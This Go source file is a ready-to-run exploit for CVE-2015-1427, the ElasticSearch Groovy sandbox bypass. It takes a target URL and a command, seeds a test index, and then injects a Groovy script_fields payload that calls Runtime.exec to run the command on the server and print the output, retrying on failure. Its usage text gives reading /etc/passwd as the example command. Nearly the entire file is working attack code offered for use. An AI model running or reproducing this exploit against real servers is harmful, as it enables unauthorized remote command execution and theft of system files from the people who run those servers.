/*
 * @Author: twsec
 * @Date: 2022-12-24 15:32:16
 * @LastEditors: twsec
 * @LastEditTime: 2023-12-20 11:14:07
 * @Description:ElasticSearch Groovy 沙盒绕过 && 代码执行漏洞-EXP
 */
package main

import (
	"fmt"

	"flag"
	"strings"
	"time"

	"github.com/parnurzeal/gorequest"

	_ "github.com/aloxc/gobanner/banner"
)

func main() {

	//输出多行字符串
	fmt.Println(`CVE-2015-1427-EXP编译合适的版本，Usage: ./CVE-2015-1427-EXP.* -t URL(http://x.x.x.x/) -c command(cat /etc/passwd)
		

		想念你的时候，我会用你的名字喊醒自己。

							--《我想和你叙叙旧》`)

	target := flag.String("t", "", "目标URL")
	command := flag.String("c", "", "要执行的命令")
	//-h 提示
	flag.Usage = func() {
		fmt.Println("Usage: ./CVE-2015-1427-EXP.* -t URL(http://x.x.x.x/) -c command(cat /etc/passwd)")

	}

	flag.Parse()
	//用户不按格式输入时提示
	if *target == "" || *command == "" {
		flag.Usage()
		return
	}
	gorequestPost(*target, *command)
}

type Data struct {
	Name string `json:"name"`
}

// gorequest post请求
func gorequestPost(Url string, Cmd string) {
	Url = Url + "/test/test/"
	request := gorequest.New()
	resp, _, errs := request.Post(Url).
		Send(map[string]string{"name": "test"}).
		End()
	if errs != nil {
		fmt.Println(errs)
	}
	if resp.StatusCode == 201 {

		fmt.Println("创建成功！")
		//执行命令
		Url = Url + "/_search?pretty"
		jsonData := `{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}`

		// 将 "id" 替换为用户输入的变量 "cmd"
		//Cmd = strings.Replace(Cmd, "\n", "", -1)
		//Cmd = strings.Replace(Cmd, " ", "", -1)
		modifiedJSON := strings.Replace(jsonData, "id", Cmd, -1)
		//输出修改后的json
		//fmt.Println(modifiedJSON)
		request := gorequest.New()
		resp, body, errs := request.Post(Url).
			Send(modifiedJSON).
			End()
		if errs != nil {
			fmt.Println(errs)
		}
		//如果响应状态码为200，则表示执行成功,否则重试
		if resp.StatusCode == 200 {
			fmt.Println("命令执行成功！")
			fmt.Println(body)

		} else {
			fmt.Println("执行失败！正在重试！")
			//重试3次后退出
			for i := 0; i < 3; i++ {
				time.Sleep(3 * time.Second)
				resp, body, errs := request.Post(Url).
					Send(modifiedJSON).
					End()
				if errs != nil {
					fmt.Println(errs)
				}
				if resp.StatusCode == 200 {
					fmt.Println("命令执行成功！")
					fmt.Println(body)

				} else {
					fmt.Println("执行失败！正在重试！")
				}
				//重试3次后提示失败
				if i == 2 {
					fmt.Println("执行失败！漏洞可能不存在或请重试！")
				}
			}
		}
	} else {
		fmt.Println("创建失败！漏洞可能不存在或请重试！")
	}
}
